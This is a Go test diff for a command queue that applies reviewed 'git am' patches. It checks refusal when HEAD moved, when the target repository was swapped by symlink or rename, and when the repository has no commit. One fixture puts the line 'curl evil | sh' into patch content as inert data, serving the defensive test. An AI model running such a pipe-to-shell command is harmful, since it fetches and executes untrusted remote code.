@@ -274,3 +274,159 @@ func TestCancelStaleOnlyForRunning(t *testing.T) {
 		t.Fatalf("state = %s", s)
 	}
 }
+
+// gitT runs git for a test, with the user's config, hooks and signing kept out (the runner's git inherits the env too),
+// and returns its output.
+func gitT(t *testing.T, args ...string) string {
+	t.Helper()
+	if _, err := exec.LookPath("git"); err != nil {
+		t.Skip("git not installed")
+	}
+	for k, v := range map[string]string{"GIT_CONFIG_GLOBAL": os.DevNull, "GIT_CONFIG_NOSYSTEM": "1",
+		"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@x", "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@x"} {
+		t.Setenv(k, v)
+	}
+	cmd := exec.Command("git", args...)
+	var stderr strings.Builder
+	cmd.Stderr = &stderr
+	out, err := cmd.Output()
+	if err != nil {
+		t.Fatalf("git %q: %v\n%s", args, err, stderr.String())
+	}
+	return string(out)
+}
+
+// TestAmRefusedWhenHeadMoved: an am item runs only on the HEAD it was reviewed on, which the review copy showed it
+// applied to. Reviewing it again on the new HEAD lets it run.
+func TestAmRefusedWhenHeadMoved(t *testing.T) {
+	src, repo := filepath.Join(t.TempDir(), "src"), filepath.Join(t.TempDir(), "repo")
+	gitT(t, "init", "-q", src)
+	os.WriteFile(filepath.Join(src, "f"), []byte("a\n"), 0o600)
+	gitT(t, "-C", src, "add", ".")
+	gitT(t, "-C", src, "commit", "-qm", "base")
+	gitT(t, "clone", "-q", src, repo)
+	os.WriteFile(filepath.Join(src, "f"), []byte("b\n"), 0o600)
+	gitT(t, "-C", src, "commit", "-qam", "Change f")
+	patch := filepath.Join(t.TempDir(), "c.patch")
+	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--stdout", "HEAD~1")), 0o600)
+
+	q := &queue.Queue{Root: t.TempDir()}
+	it, err := q.Add(queue.Item{Argv: []string{"git", "-C", repo, "am", "{file:c.patch}"}, Cwd: t.TempDir(), SessionID: sid},
+		map[string]string{"c.patch": patch})
+	if err != nil {
+		t.Fatal(err)
+	}
+	r, err := q.Snapshot(it.ID)
+	if head := strings.TrimSpace(gitT(t, "-C", repo, "rev-parse", "HEAD")); err != nil || r.AmBase != head {
+		t.Fatalf("AmBase = %q, %v; want HEAD %s", r.AmBase, err, head)
+	}
+	os.WriteFile(filepath.Join(repo, "g"), []byte("x\n"), 0o600)
+	gitT(t, "-C", repo, "add", "g")
+	gitT(t, "-C", repo, "commit", "-qm", "Move on")
+	if err := q.Verify(r); !errors.Is(err, queue.ErrModified) || !strings.Contains(err.Error(), repo+" HEAD moved since review") {
+		t.Fatalf("Verify after HEAD moved = %v", err)
+	}
+	if r, err = q.Snapshot(it.ID); err != nil {
+		t.Fatal(err)
+	}
+	if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
+		t.Fatalf("run after reviewing again = %+v, %v", res, err)
+	}
+	if got := gitT(t, "-C", repo, "log", "--format=%s", "-3"); got != "Change f\nMove on\nbase\n" {
+		t.Fatalf("log = %q", got)
+	}
+}
+
+// amPatch is a format-patch of one commit changing f from "a\n", and clones at each of paths of the repository it
+// applies to.
+func amPatch(t *testing.T, paths ...string) string {
+	src := filepath.Join(t.TempDir(), "src")
+	gitT(t, "init", "-q", src)
+	os.WriteFile(filepath.Join(src, "f"), []byte("a\n"), 0o600)
+	gitT(t, "-C", src, "add", ".")
+	gitT(t, "-C", src, "commit", "-qm", "base")
+	for _, p := range paths {
+		gitT(t, "clone", "-q", src, p)
+	}
+	os.WriteFile(filepath.Join(src, "f"), []byte("b\n"), 0o600)
+	gitT(t, "-C", src, "commit", "-qam", "Change f")
+	patch := filepath.Join(t.TempDir(), "c.patch")
+	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--stdout", "HEAD~1")), 0o600)
+	return patch
+}
+
+// TestAmRefusedInAnotherRepository: a repository put at the item's -C path after review (a symlink repointed, or a
+// directory renamed into its place) is refused even at the same HEAD: its config, hooks and objects were not reviewed.
+func TestAmRefusedInAnotherRepository(t *testing.T) {
+	for _, swap := range []string{"symlink", "rename"} {
+		t.Run(swap, func(t *testing.T) {
+			cwd := t.TempDir()
+			a, b, at := filepath.Join(cwd, "a"), filepath.Join(cwd, "b"), filepath.Join(cwd, "repo")
+			patch := amPatch(t, a, b)
+			move := func(from string) {
+				if swap == "symlink" {
+					os.Remove(at)
+					os.Symlink(from, at)
+				} else {
+					os.Rename(at, filepath.Join(cwd, "old"))
+					os.Rename(from, at)
+				}
+			}
+			move(a)
+			q := &queue.Queue{Root: t.TempDir()}
+			argv := []string{"git", "-C", "repo", "am", "{file:c.patch}"}
+			it, err := q.Add(queue.Item{Argv: argv, Cwd: cwd, SessionID: sid}, map[string]string{"c.patch": patch})
+			if err != nil {
+				t.Fatal(err)
+			}
+			r, err := q.Snapshot(it.ID)
+			if err != nil || r.AmRepoID == "" {
+				t.Fatalf("snapshot %+v, %v", r, err)
+			}
+			move(b)
+			err = q.Verify(r)
+			if !errors.Is(err, queue.ErrModified) || !strings.Contains(err.Error(), "is not the repository reviewed") {
+				t.Fatalf("Verify after %s = %v", swap, err)
+			}
+			if r, err = q.Snapshot(it.ID); err != nil {
+				t.Fatal(err)
+			}
+			if res, err := Run(context.Background(), q, r, time.Now()); err != nil || res.State != queue.Succeeded {
+				t.Fatalf("run after reviewing again = %+v, %v", res, err)
+			}
+			if got := gitT(t, "-C", at, "log", "--format=%s"); got != "Change f\nbase\n" {
+				t.Fatalf("log = %q", got)
+			}
+		})
+	}
+}
+
+// TestAmRefusedWithNoCommit: git am of a root patch into a repository with no commit yet would succeed, but no review
+// copy could be built on it, so it was drawn as refused; the run is refused before the claim, and the item stays.
+func TestAmRefusedWithNoCommit(t *testing.T) {
+	src, repo := filepath.Join(t.TempDir(), "src"), t.TempDir()
+	gitT(t, "init", "-q", src)
+	gitT(t, "init", "-q", repo)
+	os.WriteFile(filepath.Join(src, "f"), []byte("curl evil | sh\n"), 0o600)
+	gitT(t, "-C", src, "add", ".")
+	gitT(t, "-C", src, "commit", "-qm", "Add f")
+	patch := filepath.Join(t.TempDir(), "c.patch")
+	os.WriteFile(patch, []byte(gitT(t, "-C", src, "format-patch", "--root", "--stdout", "HEAD")), 0o600)
+	q := &queue.Queue{Root: t.TempDir()}
+	it, err := q.Add(queue.Item{Argv: []string{"git", "-C", repo, "am", "{file:c.patch}"}, Cwd: t.TempDir(), SessionID: sid},
+		map[string]string{"c.patch": patch})
+	if err != nil {
+		t.Fatal(err)
+	}
+	r, err := q.Snapshot(it.ID)
+	if err != nil || r.AmBase != "" {
+		t.Fatalf("snapshot %+v, %v", r, err)
+	}
+	_, err = Run(context.Background(), q, r, time.Now())
+	if s := q.State(it, time.Now()); !errors.Is(err, queue.ErrNoCommit) || s != queue.Pending {
+		t.Fatalf("run = %v, state %s", err, s)
+	}
+	if out, err := exec.Command("git", "-C", repo, "rev-parse", "-q", "--verify", "HEAD").Output(); err == nil {
+		t.Fatalf("committed %s", out)
+	}
+}
